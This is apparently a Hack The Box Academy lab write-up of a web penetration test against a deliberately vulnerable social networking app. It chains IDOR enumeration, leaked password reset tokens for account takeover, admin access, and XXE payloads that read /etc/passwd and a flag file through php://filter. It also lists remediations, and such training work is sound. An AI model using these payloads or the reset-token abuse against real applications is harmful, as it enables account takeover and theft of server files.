# Social Networking Application – Penetration Test Skill Assessment

**Author:** Jordan Davis  
**Platform:** Hack The Box Academy  
**Scenario:** Vulnerability Assessment of a Social Networking Application

---

## 🧠 Overview
This assessment simulated a **web application penetration test** against the latest build of a vulnerable social networking application.  
The objective was to enumerate, identify, and exploit multiple vulnerabilities to ultimately retrieve the final flag.

The engagement demonstrated how a chain of seemingly simple vulnerabilities — **IDOR, broken access control, insecure password reset, privilege escalation, and XXE injection** — can be combined into a full compromise.

---

## 🔑 Key Concepts
- Insecure Direct Object Reference (**IDOR**)  
- Broken Access Control  
- Burp Suite Intruder (parameter fuzzing)  
- Password Reset Token Abuse → Account Takeover  
- Privilege Escalation via Admin Account  
- XML External Entity (**XXE**) Injection  
- `php://filter` Wrapper Exploitation  

---

## 🛠️ Tools & Techniques
- **Burp Suite** (Intruder, Repeater, Proxy)  
- **Custom XML Payloads** for XXE exploitation  
- **Base64 decoding** for source code exfiltration  
- **Parameter fuzzing & token manipulation**  

---

## 📝 Walkthrough / Write-Up

### **Stage 1 – Initial Exploration**
Authenticated with provided test credentials. Observed the following request:

```
GET /api.php/user/74 HTTP/1.1
Cookie: PHPSESSID=...; uid=74
```

Response contained JSON user profile data. The predictable `uid` parameter suggested possible **IDOR**.

---

### **Stage 2 – IDOR Enumeration**
Used **Burp Intruder** to fuzz the `uid` parameter (1–100).  
Confirmed sensitive profile data exposure across users.

![Burp Intruder Fuzzing Attack](Web_Attacks_Module/images/intruder-fuzz.png)

```
{
  "uid": "88",
  "username": "e.hagen",
  "full_name": "Eddie Hagen",
  "company": "Murphy - Hansen"
}
```

✅ **Impact:** Any authenticated user could enumerate all other users.

---

### **Stage 3 – Password Reset Token Abuse**
Discovered endpoint:
```
GET /api.php/token/{uid}
```
Returned valid password reset tokens for all users.  
Exploited by crafting reset requests:

```
GET /reset.php?uid=1&token=<stolen_token>&password=password
```

Result: Arbitrary **account takeover**.  

![Password Reset Abuse](Web_Attacks_Module/images/token-abuse.png)

✅ Confirmed by resetting multiple accounts.

---

### **Stage 4 – Privilege Escalation**
During enumeration, identified admin account:

```
{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

Reset password for UID 52 via token abuse. Logged in as **Administrator**, unlocking privileged functionality (XML event creation).

![Admin Enumeration](Web_Attacks_Module/images/admin-enum.png)

✅ **Impact:** Full administrative access.

---

### **Stage 5 – XXE Injection**
The `/addEvent.php` endpoint accepted XML:

```xml
<root>
  <name>test</name>
  <details>test</details>
  <date>2025-10-10</date>
</root>
```

Reflected `name` field made it ideal for injection.

**XXE Payload:**
```xml
<!DOCTYPE form [ <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<root>
  <name>&file;</name>
  <details>test</details>
  <date>2025-10-10</date>
</root>
```

Result: Retrieved `/etc/passwd`. Confirmed **XXE file read**.

![XXE Exploit](Web_Attacks_Module/images/xxe-exploit.png)

---

### **Stage 6 – Flag Retrieval via php://filter**
Direct `.php` reads failed. Switched to `php://filter` for base64 exfiltration:

```xml
<!DOCTYPE form [
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
  <name>&file;</name>
  <details>test</details>
  <date>2025-10-10</date>
</root>
```

Response returned base64-encoded file contents.  
Decoded locally → retrieved flag. ✅

---

## 🧱 Challenges Faced
- Wasted time fuzzing non-matching payloads.  
- Misjudged filter logic before pivoting to `php://filter`.  
- Token handling required precise request crafting.  

---

## 🛡️ Defense & Remediation

### 🔒 Access Control & IDOR
- Enforce server-side checks restricting data to owner.
- Replace sequential IDs with opaque identifiers (UUIDs).

### 🔑 Password Reset Security
- Tokens must be unpredictable, session-bound, and short-lived.
- Validate rightful ownership before allowing resets.

### 🧑‍💻 Privilege Separation
- Implement strict RBAC controls.
- Audit and restrict administrative endpoints.

### 🛡️ XXE Mitigation
- Disable external entity parsing in XML processors.
- Prefer JSON over XML for data exchange.
- Validate and sanitize all user-supplied input.

---

## 📊 Impact
- **Sensitive data exposure** (IDOR)
- **Arbitrary account takeover** (reset token abuse)
- **Full administrative compromise**
- **Arbitrary file read & source code disclosure**
- **Flag retrieval via XXE exploitation**

---

## ✅ Final Thoughts
This assessment highlighted how **low-to-medium severity issues can chain into complete compromise**:  
- IDOR → Account Takeover  
- Token Abuse → Admin Privileges  
- Admin Access → XXE Exploitation  
- XXE → Sensitive File Disclosure + Flag

This mirrors real-world penetration tests, where multiple misconfigurations compound into high-impact exploitation.

---

## 🔗 Author & Profiles
- **Author:** Jordan Davis  
- [GitHub Profile](https://github.com/jd-cybersec)  
- [LinkedIn Profile](https://www.linkedin.com/in/jordan-davis47/)
